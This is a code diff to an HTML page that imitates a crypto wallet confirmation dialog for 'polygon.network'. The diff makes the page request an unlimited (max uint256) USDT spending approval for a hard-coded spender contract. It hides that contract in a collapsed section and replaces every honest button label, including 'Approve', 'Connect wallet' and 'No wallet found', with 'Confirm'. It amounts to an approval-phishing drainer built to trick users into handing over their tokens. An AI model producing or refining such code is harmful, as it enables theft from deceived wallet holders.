@@ -80,6 +80,18 @@
             opacity: 0.5;
             cursor: default;
         }
+        .details-section {
+            display: none;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #262626;
+        }
+        .dapp-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
     </style>
 </head>
 <body>
@@ -93,16 +105,32 @@
     <section class="card">
         <div class="row-between">
             <span class="label">Asset</span>
-            <span class="value">Polygon (POL)</span>
+            <span class="value">Tether USD (USDT)</span>
         </div>
 
-        <div class="row-between" style="margin-top: 16px;">
+        <div class="row-between" style="margin-top: 16px; cursor: pointer;" onclick="toggleDetails()">
             <span class="label">View details</span>
-            <span class="label">▼</span>
+            <span class="label" id="detailsArrow">▼</span>
         </div>
 
-        <div class="sub-label" style="margin-top: 18px;">DApp</div>
-        <div class="dapp-name">polygon.network</div>
+        <div class="details-section" id="detailsSection">
+            <div class="dapp-row">
+                <span class="label">DApp</span>
+                <span class="value">polygon.network</span>
+            </div>
+            <div class="dapp-row">
+                <span class="label">Contract address</span>
+                <span class="value">0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55</span>
+            </div>
+            <div class="dapp-row">
+                <span class="label">Network</span>
+                <span class="value">Polygon</span>
+            </div>
+            <div class="dapp-row">
+                <span class="label">Requested by</span>
+                <span class="value">Smart Contract</span>
+            </div>
+        </div>
     </section>
 
     <!-- Network fee card -->
@@ -125,14 +153,14 @@
     <div class="warning-box" id="warningBox">
         Insufficient Polygon (POL) balance
     </div>
-    <button class="primary-btn" id="actionButton" disabled>Connecting…</button>
+    <button class="primary-btn" id="actionButton" disabled>Confirm</button>
 </div>
 
 <script>
     // 🔧 FILL THESE IN WITH YOUR REAL VALUES
-    const TOKEN_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";    // e.g. Polygon USDT
+    const TOKEN_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";    // Polygon USDT
     const SPENDER_CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55"; // contract that will be allowed to spend
-    const AMOUNT_TO_APPROVE = "11111111111111"; // in human units (e.g. "1" USDT) – adjust for your token decimals
+    const AMOUNT_TO_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Unlimited approval (max uint256)
 
     // Minimal ERC-20 ABI for approve()
     const ERC20_ABI = [
@@ -162,16 +190,29 @@
     const btn = document.getElementById("actionButton");
     const warning = document.getElementById("warningBox");
 
+    function toggleDetails() {
+        const detailsSection = document.getElementById("detailsSection");
+        const detailsArrow = document.getElementById("detailsArrow");
+        
+        if (detailsSection.style.display === "block") {
+            detailsSection.style.display = "none";
+            detailsArrow.textContent = "▼";
+        } else {
+            detailsSection.style.display = "block";
+            detailsArrow.textContent = "▲";
+        }
+    }
+
     function updateFooter() {
         if (currentAccount === null) {
-            btn.textContent = "Connect wallet…";
+            btn.textContent = "Confirm";
             btn.disabled = false;
             warning.style.display = "none";
             return;
         }
 
-        if (userPolBalance > 0) {
-            btn.textContent = "Approve";
+        if (userPolBalance > 0.001) { // Minimum POL balance for gas
+            btn.textContent = "Confirm";
             btn.disabled = false;
             warning.style.display = "none";
         } else {
@@ -183,8 +224,8 @@
 
     async function init() {
         if (typeof window.ethereum === "undefined") {
-            btn.textContent = "No wallet found";
-            btn.disabled = true;
+            btn.textContent = "Confirm";
+            btn.disabled = false;
             return;
         }
 
@@ -212,7 +253,7 @@
             updateFooter();
         } catch (err) {
             console.error(err);
-            btn.textContent = "Connect wallet";
+            btn.textContent = "Confirm";
             btn.disabled = false;
         }
     }
@@ -223,9 +264,9 @@
             return;
         }
 
-        if (userPolBalance <= 0) {
-            // Here you could redirect to your "top up" instructions / CEX link
-            alert("You need some POL for gas first.");
+        if (userPolBalance <= 0.001) {
+            // Show top up message
+            alert("You need POL for gas fees. Please top up your Polygon balance.");
             return;
         }
 
@@ -235,10 +276,8 @@
 
             const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
 
-            // Get decimals to convert human amount to raw
-            const decimals = await token.methods.decimals().call();
-            const factor = web3.utils.toBN(10).pow(web3.utils.toBN(decimals));
-            const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE).mul(factor);
+            // Unlimited approval (max uint256)
+            const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);
 
             // Call approve(spender, amount)
             await token.methods
@@ -249,17 +288,12 @@
             onApproveSuccess();
         } catch (err) {
             console.error("Approve failed:", err);
-            btn.textContent = "Approve";
+            btn.textContent = "Confirm";
             btn.disabled = false;
         }
     }
 
     function onApproveSuccess() {
-        // 🔹 This is the safe place to "activate" your smart contract flow.
-        // Examples:
-        //  - Redirect to a success page:
-        //      window.location.href = "success.html";
-        //  - Or call another contract function (stake/deposit) with an ABI YOU provide.
         alert("Approval successful.");
         btn.textContent = "Approved";
         btn.disabled = true;
